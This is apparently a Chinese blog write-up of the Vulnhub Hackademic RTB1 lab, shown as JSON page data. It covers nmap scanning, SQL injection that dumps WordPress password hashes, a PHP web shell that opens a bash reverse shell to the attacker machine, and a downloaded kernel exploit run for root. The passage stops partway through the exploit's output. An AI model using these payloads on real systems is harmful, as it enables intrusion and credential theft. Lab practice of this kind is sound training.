{"pageProps":{"postData":{"id":"VulnhubHackademic RTB1","contentHtml":"<h1>Hackademic.RTB1</h1>\n<p>第一次打靶机，思路看的红队笔记</p>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/hackademic-rtb1,17/\">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a></p>\n</blockquote>\n<p>环境：kali Linux - 192.168.75.131，靶机 - 192.168.75.132</p>\n<h2>主机发现和端口扫描</h2>\n<ol>\n<li>\n<p>扫描整个网络有哪台机子在线，不进行端口扫描</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span> \n</code></pre>\n<pre><code class=\"hljs language-php\">Starting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-19 09:41 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00027</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00039</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B7:EB:<span class=\"hljs-title function_ invoke__\">D3</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00058</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:F8:B3:<span class=\"hljs-number\">1</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>\nHost is up.\nNmap done: <span class=\"hljs-number\">256</span> IP <span class=\"hljs-title function_ invoke__\">addresses</span> (<span class=\"hljs-number\">5</span> hosts up) scanned in <span class=\"hljs-number\">2.01</span> seconds\n</code></pre>\n<p>因为靶机是我最后添加的，所以基本可以锁定是<code>132</code></p>\n</li>\n<li>\n<p>执行快速扫描全端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">Starting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-19 09:44 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0014</span>s latency).\nNot shown: <span class=\"hljs-number\">65514</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response), <span class=\"hljs-number\">19</span> filtered tcp <span class=\"hljs-title function_ invoke__\">ports</span> (host-unreach)\nPORT   STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp closed ssh\n<span class=\"hljs-number\">80</span>/tcp open   http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B7:EB:<span class=\"hljs-title function_ invoke__\">D3</span> (VMware)\n\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">13.60</span> seconds\n</code></pre>\n<p>扫描出两个端口22和80，不过因为22是关闭的所以没什么用处，剩下一个80端口</p>\n</li>\n<li>\n<p>针对地址使用TCP扫描，探测端口22和80上的服务版本以及操作系统</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p22,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>     \n</code></pre>\n<pre><code class=\"hljs language-php\">Starting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-19 09:49 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00076</span>s latency).\n\nPORT   STATE  SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp closed ssh\n<span class=\"hljs-number\">80</span>/tcp open   http    Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">15</span> ((Fedora))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B7:EB:<span class=\"hljs-title function_ invoke__\">D3</span> (VMware)\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">22</span> - <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">36</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at https:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">8.57</span> seconds\n</code></pre>\n<p>探测到是服务器是<code>Apache2.2.15</code>系统是红帽<code>Dedora</code></p>\n</li>\n<li>\n<p>扫描UDP端口</p>\n<pre><code class=\"hljs language-php\">nmap -sU -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">Starting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-19 09:53 CST</span>\nWarning: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span> giving up on port because retransmission cap <span class=\"hljs-title function_ invoke__\">hit</span> (<span class=\"hljs-number\">10</span>).\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00094</span>s latency).\nAll <span class=\"hljs-number\">65535</span> scanned ports on <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span> are in ignored states.\nNot shown: <span class=\"hljs-number\">65457</span> open|filtered udp <span class=\"hljs-title function_ invoke__\">ports</span> (no-response), <span class=\"hljs-number\">78</span> filtered udp <span class=\"hljs-title function_ invoke__\">ports</span> (host-prohibited)\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B7:EB:<span class=\"hljs-title function_ invoke__\">D3</span> (VMware)\n\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">72.94</span> seconds\n</code></pre>\n<p>没有UDP端口打开</p>\n</li>\n<li>\n<p>漏洞扫描</p>\n<pre><code class=\"hljs language-php\">nmap -script=vuln -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">Starting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-19 09:56 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00085</span>s latency).\n\nPORT   STATE  SERVICE\n<span class=\"hljs-number\">22</span>/tcp closed ssh\n<span class=\"hljs-number\">80</span>/tcp open   http\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-trace: TRACE is enabled\n| http-enum: \n|_  /icons/: Potentially interesting folder w/ directory listing\n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.\n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\n| http-vuln-cve2011-3192: \n|   VULNERABLE:\n|   Apache byterange filter DoS\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2011-3192  BID:49303\n|       The Apache web server is vulnerable to a denial of service attack when numerous\n|       overlapping byte ranges are requested.\n|     Disclosure date: 2011-08-19\n|     References:\n|       https://www.securityfocus.com/bid/49303\n|       https://seclists.org/fulldisclosure/2011/Aug/175\n|       https://www.tenable.com/plugins/nessus/55976\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server'</span>s resources causing Denial Of Service.\n|       \n|     Disclosure date: <span class=\"hljs-number\">2009</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">17</span>\n|     References:\n|       http:<span class=\"hljs-comment\">//ha.ckers.org/slowloris/</span>\n|_      https:<span class=\"hljs-comment\">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span>\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:B7:EB:<span class=\"hljs-title function_ invoke__\">D3</span> (VMware)\n\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">145.51</span> seconds\n</code></pre>\n<p>找到个有趣的文件夹  <code>/icons/</code> ，并且该靶机容易遭受<code>DDos</code> ，不过对我们没有帮助</p>\n</li>\n</ol>\n<h2>渗透阶段</h2>\n<ol>\n<li>\n<p>访问主机web服务1</p>\n<p><img src=\"/post-images/VulnhubHackademic%20RTB1/image.png\" alt=\"image.png\"></p>\n<p>点击target目标得到信息，就是然我们获得root权限，然后读取key.txt</p>\n<pre><code class=\"hljs language-php\">Got root?!\nFriday, January <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">2011</span> | <span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">08</span> am\n\nThis is the first Realistic Hackademic <span class=\"hljs-title function_ invoke__\">Challenge</span> (root this box).\nHave you got the skills to exploit this box <span class=\"hljs-keyword\">and</span> to take root?\n\nGoal:\nGain access to <span class=\"hljs-title function_ invoke__\">the</span> (HackademicRTB1) box <span class=\"hljs-keyword\">and</span> read the “Key.txt” file in the root directory.\n</code></pre>\n</li>\n<li>\n<p>发现，点击页面的<code>Get root</code>链接后的url是这样的</p>\n<pre><code class=\"hljs language-php\">http:<span class=\"hljs-comment\">//192.168.75.132/Hackademic_RTB1/?p=9</span>\n</code></pre>\n<p>以及下方 <code>Uncategorized</code> 的链接</p>\n<pre><code class=\"hljs language-php\">http:<span class=\"hljs-comment\">//192.168.75.132/Hackademic_RTB1/?cat=1</span>\n</code></pre>\n<p><code>?p</code> 以及<code>?cat</code>很可能存在<code>sql</code>注入漏洞</p>\n</li>\n<li>\n<p>尝试一下<code>sql</code>注入和文件包含</p>\n<p><code>p</code>参数无任何回显，应该不存在sql注入和文件包含</p>\n<p><code>cat</code>输入<code>1'</code> ,发现页面回显有问题，把sql语句爆了出来，<code>SELECT * FROM wp_categories WHERE cat_ID = 1\\\\\\' LIMIT 1</code> ，并且可以看到表是<code>wp_categories</code></p>\n<p><img src=\"/post-images/VulnhubHackademic%20RTB1/image1.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>尝试注入，手工</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// 存在注入点</span>\nhttp:<span class=\"hljs-comment\">//192.168.75.132/Hackademic_RTB1/?cat=1 and 1=2</span>\n<span class=\"hljs-comment\">// 表的列数有五列</span>\nhttp:<span class=\"hljs-comment\">//192.168.75.132/Hackademic_RTB1/?cat=1 order by 5</span>\n<span class=\"hljs-comment\">// 爆回显位，页面回显位是第二位</span>\nhttp:<span class=\"hljs-comment\">//192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,2,3,4,5</span>\n<span class=\"hljs-comment\">// 爆库，页面回显 wordpress ，表示库名是wordpress </span>\nhttp:<span class=\"hljs-comment\">//192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,database(),3,4,5</span>\n</code></pre>\n</li>\n<li>\n<p>发现库名是<code>wordpress</code> ，猜测CMS是<code>wordpress</code> ，我们寻找一下看看有没有有用的信息</p>\n<p><img src=\"/post-images/VulnhubHackademic%20RTB1/image2.png\" alt=\"image.png\"></p>\n<p>发现确实是<code>wordpress</code>并且版本是<code>1.5.11</code></p>\n</li>\n<li>\n<p>为了方便注入，我们到网上查找<code>wordpress</code>的表结构</p>\n<blockquote>\n<p><a href=\"https://codex.wordpress.org/Database_Description/2.0\">https://codex.wordpress.org/Database_Description</a></p>\n</blockquote>\n<p>值得我们关注的是 **<code>wp_users</code>**表</p>\n<p><code>user_login</code>，<code>user_pass</code>，<code>user_level</code> 中的三个字段</p>\n</li>\n<li>\n<p>接着注入</p>\n<p>获取表的<code>user_login</code>，<code>user_pass</code>，<code>user_level</code> 中的三个字段，并以<code>-</code>为分隔符</p>\n<pre><code class=\"hljs language-php\">http:<span class=\"hljs-comment\">//192.168.75.132/Hackademic_RTB1/?cat=0 union select 1,group_concat(user_login,0x2d,user_pass,0x2d,user_level),3,4,5 from wp_users</span>\n</code></pre>\n<p>得到数据：</p>\n<pre><code class=\"hljs language-php\">NickJames-<span class=\"hljs-number\">21232</span>f297a57a5a743894a0e4a801fc3-<span class=\"hljs-number\">1</span>,\nJohnSmith-b986448f0bb9e5e124ca91d3d650f52c-<span class=\"hljs-number\">0</span>,\nGeorgeMiller-<span class=\"hljs-number\">7</span>cbb3252ba6b7e9c422fac5334d22054-<span class=\"hljs-number\">10</span>,\nTonyBlack-a6e514f9486b83cb53d8d932f9a04292-<span class=\"hljs-number\">0</span>,\nJasonKonnors-<span class=\"hljs-number\">8601</span>f6e1028a8e8a966f6c33fcd9aec4-<span class=\"hljs-number\">0</span>,\nMaxBucky-<span class=\"hljs-number\">50484</span>c19f1afdaf3841a0d821ed393d2-<span class=\"hljs-number\">0</span>\n</code></pre>\n<p>可以发现<code>GeorgeMiller</code> 的权限是10是最大的，密码格式看着像是<code>md5</code>，我们拿到cmd5破解</p>\n<p>查询结果：<code>q1w2e3</code></p>\n</li>\n<li>\n<p>我们找到后台，使用<code>GeorgeMiller</code> 登陆进去</p>\n<p>后台地址是 ： <code>http://192.168.75.132/Hackademic_RTB1/wp-login.php</code></p>\n<p>登陆成功！</p>\n</li>\n</ol>\n<h2>登录后台上传shell</h2>\n<p>登陆后台后，wordpress我们一般要做的是打开文件上传功能，并且上传getshell</p>\n<ol>\n<li>\n<p>开启文件上传功能，并且添加php后缀</p>\n<p><img src=\"/post-images/VulnhubHackademic%20RTB1/image3.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>上传getshell.php</p>\n<p><img src=\"/post-images/VulnhubHackademic%20RTB1/image4.png\" alt=\"image.png\"></p>\n<p>文件内容是：</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// getshell.php</span>\n<span class=\"hljs-meta\">&#x3C;?php</span> <span class=\"hljs-title function_ invoke__\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.75.131/1234 0>&#x26;1'\"</span>); <span class=\"hljs-meta\">?></span>\n</code></pre>\n<p>上传成功,并且返回路径 <code>/Hackademic_RTB1/wp-content/getshell.php</code></p>\n</li>\n<li>\n<p>反弹shell</p>\n<p>首先Kali先开启监听，监听<code>1234</code>端口</p>\n<pre><code class=\"hljs language-php\">nc -lvp <span class=\"hljs-number\">1234</span>                             \nlistening on [any] <span class=\"hljs-number\">1234</span> ...\n</code></pre>\n<p>再访问<code>/Hackademic_RTB1/wp-content/getshell.php</code></p>\n<p>最后查看kali，发现反弹shell成功</p>\n<pre><code class=\"hljs language-php\">istening on [any] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.132</span>] <span class=\"hljs-number\">49339</span>\nbash: no job control in this shell\nbash-<span class=\"hljs-number\">4.0</span>$ ls\nls\ngetshell.php\ngetshell_01.php\nplugins\nthemes\nbash-<span class=\"hljs-number\">4.0</span>$ \n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>先用python增强shell的交互性</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// 靶机shell</span>\npython -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/bash')\"</span>\n</code></pre>\n</li>\n<li>\n<p>查看shell权限</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// 靶机shell</span>\nbash-<span class=\"hljs-number\">4.0</span>$ whoami\napache\n\nbash-<span class=\"hljs-number\">4.0</span>$ dpkg -l\nbash: dpkg: command not found\n\nbash-<span class=\"hljs-number\">4.0</span>$ sudo -l\nsudo: sorry, you must have a tty to run sudo\n\nbash-<span class=\"hljs-number\">4.0</span>$ uname -a\nLinux HackademicRTB1 <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">31.5</span>-<span class=\"hljs-number\">127</span>.fc12.i686 <span class=\"hljs-comment\">#1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</span>\n\n</code></pre>\n<p>用户是<code>apache</code> ，<code>dpkg</code>和 <code>sudo</code> 无法使用，内核版本是<code>2.6.31.5</code> ，权限是比较低的</p>\n</li>\n<li>\n<p>因为ssh是关闭的，所以我们找密码也没有用处，看到内核版本比较老，可以尝试一下搜索内核漏洞，但是内核版本不太太详细，否则或错过一些好使的漏洞，并且过滤 “<code>Privilege Escalation</code>” - 权限提升</p>\n<pre><code class=\"hljs language-php\">searchsploit Linux Kernel <span class=\"hljs-number\">2.6</span> | grep <span class=\"hljs-string\">\"Privilege Escalation\"</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">Linux <span class=\"hljs-title function_ invoke__\">Kernel</span> (Solaris <span class=\"hljs-number\">10</span> / &#x3C; <span class=\"hljs-number\">5.10</span> <span class=\"hljs-number\">138888</span>-<span class=\"hljs-number\">01</span>) - Local Privilege Escalation | solaris/local/<span class=\"hljs-number\">15962</span>.c\nLinux Kernel <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">25</span>/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">24</span>/<span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">2</span> - <span class=\"hljs-string\">'mremap()'</span> Local Privilege Escalation  | linux/local/<span class=\"hljs-number\">160</span>.c\nLinux Kernel <span class=\"hljs-number\">2.4</span>.x/<span class=\"hljs-number\">2.6</span>.x - <span class=\"hljs-string\">'uselib()'</span> Local Privilege <span class=\"hljs-title function_ invoke__\">Escalation</span> (<span class=\"hljs-number\">3</span>)      | linux/local/<span class=\"hljs-number\">895</span>.c\nLinux Kernel <span class=\"hljs-number\">2.4</span>/<span class=\"hljs-number\">2.6</span> - <span class=\"hljs-string\">'sock_sendpage()'</span> Local Privilege <span class=\"hljs-title function_ invoke__\">Escalation</span> (<span class=\"hljs-number\">3</span>)   | linux/local/<span class=\"hljs-number\">9641</span>.txt\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">0</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">31</span> - <span class=\"hljs-string\">'pipe.c'</span> Local Privilege <span class=\"hljs-title function_ invoke__\">Escalation</span> (<span class=\"hljs-number\">1</span>)     | linux/local/<span class=\"hljs-number\">33321</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">10</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">31.5</span> - <span class=\"hljs-string\">'pipe.c'</span> Local Privilege Escalation      | linux/local/<span class=\"hljs-number\">40812</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">13</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">17.4</span> - <span class=\"hljs-string\">'sys_prctl()'</span> Local Privilege Escalation | linux/local/<span class=\"hljs-number\">2004</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">13</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">17.4</span> - <span class=\"hljs-string\">'sys_prctl()'</span> Local Privilege Escalation | linux/local/<span class=\"hljs-number\">2005</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">13</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">17.4</span> - <span class=\"hljs-string\">'sys_prctl()'</span> Local Privilege Escalation | linux/local/<span class=\"hljs-number\">2006</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">13</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">17.4</span> - <span class=\"hljs-string\">'sys_prctl()'</span> Local Privilege Escalation | linux/local/<span class=\"hljs-number\">2011</span>.sh\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">17</span> - <span class=\"hljs-string\">'Sys_Tee'</span> Local Privilege Escalation                | linux/local/<span class=\"hljs-number\">29714</span>.txt\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">17</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">24.1</span> - <span class=\"hljs-string\">'vmsplice'</span> Local Privilege <span class=\"hljs-title function_ invoke__\">Escalation</span> (<span class=\"hljs-number\">2</span> | linux/local/<span class=\"hljs-number\">5092</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">17.4</span> - <span class=\"hljs-string\">'proc'</span> Local Privilege Escalation                 | linux/local/<span class=\"hljs-number\">2013</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span> &#x3C; <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">18</span>-<span class=\"hljs-number\">20</span> - Local Privilege Escalation              | linux/local/<span class=\"hljs-number\">10613</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">19</span> &#x3C; <span class=\"hljs-number\">5.9</span> - <span class=\"hljs-string\">'Netfilter Local Privilege Escalation         | linux/local/50135.c\nLinux Kernel 2.6.23 &#x3C; 2.6.24 - '</span>vmsplice<span class=\"hljs-string\">' Local Privilege Escalation (1)  | linux/local/5093.c\nLinux Kernel 2.6.28/3.0 (DEC Alpha Linux) - Local Privilege Escalation    | linux/local/17391.c\nLinux Kernel 2.6.32 - '</span>pipe.c<span class=\"hljs-string\">' Local Privilege Escalation (4)             | linux/local/10018.sh\nLinux Kernel 2.6.36-rc8 - '</span>RDS Protocol<span class=\"hljs-string\">' Local Privilege Escalation       | linux/local/15285.c\nLinux Kernel 2.6.x - '</span>pipe.c<span class=\"hljs-string\">' Local Privilege Escalation (2)              | linux/local/33322.c\nLinux Kernel 2.6.x - Ext4 '</span>move extents<span class=\"hljs-string\">' ioctl Privilege Escalation       | linux/local/33395.txt\nLinux Kernel 2.6.x - Ptrace Privilege Escalation                          | linux/local/30604.c\nLinux Kernel 4.8.0 UDEV &#x3C; 232 - Local Privilege Escalation                | linux/local/41886.c\nLinux Kernel &#x3C; 2.6.11.5 - BlueTooth Stack Privilege Escalation            | linux/local/4756.c\nLinux Kernel &#x3C; 2.6.22 - '</span><span class=\"hljs-title function_ invoke__\">ftruncate</span>()<span class=\"hljs-string\">'/'</span><span class=\"hljs-title function_ invoke__\">open</span>()<span class=\"hljs-string\">' Local Privilege Escalation | linux/local/6851.c\nLinux Kernel &#x3C; 2.6.28 - '</span><span class=\"hljs-title function_ invoke__\">fasync_helper</span>()<span class=\"hljs-string\">' Local Privilege Escalation      | linux/local/33523.c\nLinux Kernel &#x3C; 2.6.29 - '</span><span class=\"hljs-title function_ invoke__\">exit_notify</span>()<span class=\"hljs-string\">' Local Privilege Escalation        | linux/local/8369.sh\nLinux Kernel &#x3C; 3.16.1 - '</span>Remount FUSE<span class=\"hljs-string\">' Local Privilege Escalation         | linux/local/34923.c\nLinux Kernel &#x3C; 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation | arm/local/31574.c\nLinux kernel &#x3C; 4.10.15 - Race Condition Privilege Escalation              | linux/local/43345.c\nLinux Kernel &#x3C; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation    | linux/local/44298.c\n</span></code></pre>\n<p>可以尝试一下这两个</p>\n<pre><code class=\"hljs language-php\">Linux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">36</span>-rc8 - <span class=\"hljs-string\">'RDS Protocol'</span> Local Privilege Escalation       | linux/local/<span class=\"hljs-number\">15285</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.x - <span class=\"hljs-string\">'pipe.c'</span> Local Privilege <span class=\"hljs-title function_ invoke__\">Escalation</span> (<span class=\"hljs-number\">2</span>)              | linux/local/<span class=\"hljs-number\">33322</span>.c\n</code></pre>\n</li>\n<li>\n<p>在<code>kali</code>使用 <code>searchsploit -m &#x3C;name></code> 拉取下来,并且使用<code>php -S 0:80</code> 再当前目录创建web服务器（方便靶机下载）</p>\n<pre><code class=\"hljs language-php\">earchsploit -m <span class=\"hljs-number\">15285</span>.c\nearchsploit -m <span class=\"hljs-number\">33322</span>.c\nphp -S <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">80</span>\n</code></pre>\n</li>\n<li>\n<p>使用靶机的shell下载拉取下来的<code>payload</code></p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// 靶机shell</span>\nbash-<span class=\"hljs-number\">4.0</span>$ wget <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>/<span class=\"hljs-number\">33322</span>.c <span class=\"hljs-comment\">// 重复操作</span>\n\n--<span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">09</span>-<span class=\"hljs-number\">19</span> <span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">42</span>--  http:<span class=\"hljs-comment\">//192.168.75.131/33322.c</span>\nConnecting to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>:<span class=\"hljs-number\">80</span>... connected.\nHTTP request sent, awaiting response... <span class=\"hljs-number\">200</span> OK\nLength: <span class=\"hljs-number\">4517</span> (<span class=\"hljs-number\">4.4</span>K) [text/x-c]\nSaving to: `<span class=\"hljs-number\">33322</span>.c<span class=\"hljs-string\">'\n\n     0K ....                                                  100% 5.94M=0.001s\n\n2024-09-19 04:51:42 (5.94 MB/s) - `33322.c'</span> saved [<span class=\"hljs-number\">4517</span>/<span class=\"hljs-number\">4517</span>]\n</code></pre>\n</li>\n<li>\n<p>我自己尝试了33322.c不成功，所以再尝试15285.c</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-comment\">// 靶机shell</span>\ngcc <span class=\"hljs-number\">15285</span>.c -o <span class=\"hljs-number\">15285</span> <span class=\"hljs-comment\">// 编译</span>\n\n./<span class=\"hljs-number\">15285</span> <span class=\"hljs-comment\">//运行</span>\n\n</code></pre>\n<pre><code class=\"hljs language-php\">[*] Linux kernel >= <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">30</span> RDS socket exploit\n[*] by Dan Rosenberg\n[*] Resolving kernel addresses...\n [+] Resolved security_ops to <span class=\"hljs-number\">0xc0aa19ac</span>\n [+] Resolved default_security_ops to <span class=\"hljs-number\">0xc0955c6c</span>\n [+] Resolved cap_ptrace_traceme to <span class=\"hljs-number\">0xc055d9d7</span>\n [+] Resolved commit_creds to <span class=\"hljs-number\">0xc044e5f1</span>\n [+] Resolved prepare_kernel_cred to <span 